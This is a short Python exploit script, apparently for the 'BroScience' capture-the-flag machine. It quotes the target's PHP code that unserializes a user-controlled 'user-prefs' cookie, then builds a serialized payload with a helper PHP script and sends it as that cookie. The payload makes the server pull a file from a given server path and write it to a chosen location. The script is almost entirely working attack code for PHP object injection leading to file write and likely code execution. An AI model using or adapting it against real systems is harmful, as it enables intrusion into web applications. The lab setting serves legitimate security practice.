import os
import sys
import requests

""" 
function get_theme() {
    if (isset($_SESSION['id'])) {
        if (!isset($_COOKIE['user-prefs'])) {
            $up_cookie = base64_encode(serialize(new UserPrefs()));
            setcookie('user-prefs', $up_cookie);
        } else {
            $up_cookie = $_COOKIE['user-prefs'];
        }
        $up = unserialize(base64_decode($up_cookie));
        return $up->theme;
    } else {
        return "light";
    }
}
"""

"""
curl 'https://broscience.htb/user.php?id=6' 
-H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:108.0) Gecko/20100101 Firefox/108.0' 
-H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' 
-H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate, br' -H 'Connection: keep-alive' 
-H 'Referer: https://broscience.htb/index.php' 
-H 'Cookie: PHPSESSID=cfgabvkurcvos1pp5j9488c75a' 
"""

url = "https://broscience.htb/user.php?id=6"

ai = 'payload_avatar.php'

if len(sys.argv) < 3:
    print(f"Usage: {sys.argv[0]} <to_file_path> <from_server_path>")
    sys.exit(1)

os.system(f'php ./{ai} {sys.argv[1]} {sys.argv[2]} > payload')

payload = open('payload', 'r').read()
print(f"payload is {payload}")
cookies = {'user-prefs': payload, 'PHPSESSID': 'gsufisuk1aun12fv5du218cog3'}

r = requests.get(url, cookies=cookies, verify=False)
print(r.text)
